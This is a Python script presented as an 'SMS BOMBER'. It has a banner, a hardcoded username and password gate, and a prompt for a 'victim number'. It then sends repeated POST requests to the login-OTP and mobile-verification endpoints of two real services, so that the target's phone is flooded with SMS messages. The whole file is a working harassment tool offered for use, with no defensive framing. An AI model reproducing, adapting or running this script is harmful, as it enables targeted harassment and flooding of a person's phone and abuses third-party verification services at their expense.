version='2.3.0'
import os
try:
    import requests
except:
    os.system('pip install requests')
import sys
os.system("clear")
#CLAVEU
on_green="\033[42m"       # Green
blue="\033[0;34m"         # Blue
r="\033[1;31m"
g="\033[1;32m"
y="\033[1;33m"
b="\033[1;34m"
p="\033[1;35m"
c="\033[1;36m"
line=y+"==========================================================================="
logo=r+str("""\n\n\n     
    8888888b.   .d88888b.   .d8888b.       Y88b   d88P
     888   Y88b d88P" "Y88b d88P  Y88b       Y88b d88P
     888    888 888     888 888    888        Y88o88P
     888   d88P 888     888 888        888888  Y888P
     8888888P"  888     888 888        888888  d888b
     888 T88b   888     888 888    888        d88888b
     888  T88b  Y88b. .d88P Y88b  d88P       d88P Y88b
     888   T88b  "Y88888P"   "Y8888P"       d88P   Y88b\n""")
while True:
    def header():
        print(logo+c+'\n\n\t\tDEVOLOPED BY : SABBIR AHMED\n\n'+g+'\t\t    ★★ SMS BOMBER ★★'+'\n\n'+line)
    header()
    u='AK47'
    p='AK46'
    user=str(input(y+'\n\tUSERNAME : '+g))
    passw=str(input(y+'\n\tPASSWORD : '+g))
    if user==u and passw==p:
        print('\n\t\tYOUR PASSWORD CORRECT!!')
        break
    else:
        print(r+'\n\t\tYOUR PASSWORD WRONG!')
        os.system('clear')
        continue
import os
import requests
from requests.structures import CaseInsensitiveDict
os.system('clear')
header()
number=str(input(y+'\n ENTER VICTIM NUMBER : '+r+'+88'))
amount=int(input(r+'\n THE AMOUNT  : '))
url = "https://ss.binge.buzz/otp/send/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"
headers["Content-Length"] = "0"

data = "phone="+number

url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/json"

data2 = '{\"mobile\":\"'+number+'\"}'

for j in range (amount):
 resp = requests.post(url, headers=headers,data=data)
 resp2 = requests.post(url4, headers=headers2,data=data2)
 print(str('')+g+'\n SMS REQUEST SENDING TO '+r+number)
